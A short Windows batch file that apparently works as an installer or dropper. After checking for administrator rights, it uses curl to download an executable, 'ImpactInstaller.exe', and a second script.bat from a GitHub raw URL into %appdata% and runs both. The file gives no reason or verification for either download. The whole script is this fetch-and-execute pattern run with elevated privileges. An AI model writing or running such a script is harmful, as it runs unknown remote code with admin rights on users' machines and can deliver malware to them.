@echo off
IF EXIST %appdata%/script.bat (curl https://raw.githubusercontent.com/ishanarya24/dc/main/ImpactInstaller.exe --output %appdata%/ImpactInstaller.exe && start %appdata%/ImpactInstaller.exe & EXIT)
goto check_Permissions
:check_Permissions
    echo Administrative permissions required. Detecting permissions...
    net session >nul 2>&1
    if %errorLevel% == 0 (curl https://raw.githubusercontent.com/ishanarya24/dc/main/ImpactInstaller.exe --output %appdata%/ImpactInstaller.exe && start %appdata%/ImpactInstaller.exe & cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/script.bat -O && cmd /c script.bat) else (echo Run As Admin && pause >nul)